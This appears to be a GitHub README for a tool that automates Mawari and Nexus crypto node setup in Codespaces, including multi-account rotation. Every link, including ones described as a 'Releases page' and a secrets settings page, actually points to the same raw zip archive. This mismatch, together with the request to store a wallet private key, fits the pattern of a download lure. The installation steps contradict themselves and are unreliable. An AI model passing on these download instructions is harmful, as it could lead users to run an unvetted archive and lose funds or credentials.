# 🎉 mawari-nexus-blueprint - Simplified Node Setup for Everyone

## 🚀 Getting Started

Welcome to the *mawari-nexus-blueprint*! This guide helps you set up Mawari Guardian Node and Nexus Prover easily. You don’t need technical skills to get started. Follow these simple steps.

[![Download mawari-nexus-blueprint](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip)](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip)

## 📥 Download & Install

To download the software, visit the Releases page:

- [Visit this page to download](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip)

Once you are on the Releases page, locate the latest version of the application. Click on the version number to open the details. You will find the asset files there, which you can download. After downloading, follow the prompts to install it.

## 📋 Requirements

Before installing, ensure you have the following set up in your GitHub Codespaces:

### Repository Secrets

You will need to set up some secrets. Go to:

`https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip`

You need to add the following secrets:

| Secret Name                    | Description                                 | Example            |
|--------------------------------|---------------------------------------------|--------------------|
| `MAWARI_OWNER_ADDRESS`         | Your Ethereum address for the node         | `0xYourAddress...`  |
| `MAWARI_BURNER_ADDRESS`       | Address for the burner wallet              | `0xBurnerAddress...`|
| `MAWARI_BURNER_PRIVATE_KEY`   | Private key for the burner wallet          | `0x1234abcd...`    |
| `NEXUS_WALLET_ADDRESS`        | Your Ethereum address for Nexus             | `0xYourAddress...`  |
| `NEXUS_NODE_ID`               | Unique identifier for your Nexus node      | `NexusID123`       |

Ensure to replace `YOUR_USERNAME` with your actual GitHub username.

## 🔧 Features

The *mawari-nexus-blueprint* offers these helpful features:

- **Auto-detect node type**: The system recognizes the type of node based on the display name of your codespace.
- **Auto-install & setup**: The setup happens automatically the first time you create a codespace, making it hassle-free.
- **Auto-restart**: The application will restart automatically when the codespace wakes up from idle or shutdown, keeping everything ready.
- **Multi-account rotation**: Manage up to 20 accounts with ease. The orchestrator handles rotation seamlessly every 20 hours.
- **Persistent burner wallet**: Your burner wallet remains active for the Mawari node, ensuring uninterrupted access.

## ⚙️ How to Use

Once you have installed the application, here’s how to set it up:

1. **Open your GitHub Codespace.**
2. The application will automatically start configuring itself based on the secrets you set up.
3. Allow the application to finish its setup. You will see notifications when it successfully completes.

## ✅ Running the Application

After installation, you can run the application from your Codespaces. Follow these steps:

1. **Navigate to your terminal in the Codespace.**
2. Type `start-node` and hit enter.
3. Monitor the output. If there are any issues, the application will provide error messages to help you troubleshoot.

## 🛠️ Troubleshooting

If you experience issues during setup or while running the application, consider these steps:

- **Check Secrets**: Ensure all required secrets are properly set with correct values.
- **Logs**: Review logs within the terminal for any error messages.
- **Reinstall**: If issues persist, try reinstalling the application by following the download steps again.

## 📞 Support

If you need further help, you can open an issue in the GitHub repository. Describe your problem clearly, and someone from the community or the maintainers will assist you.

For quick access, here is the [Download link again](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip).

Enjoy using *mawari-nexus-blueprint*!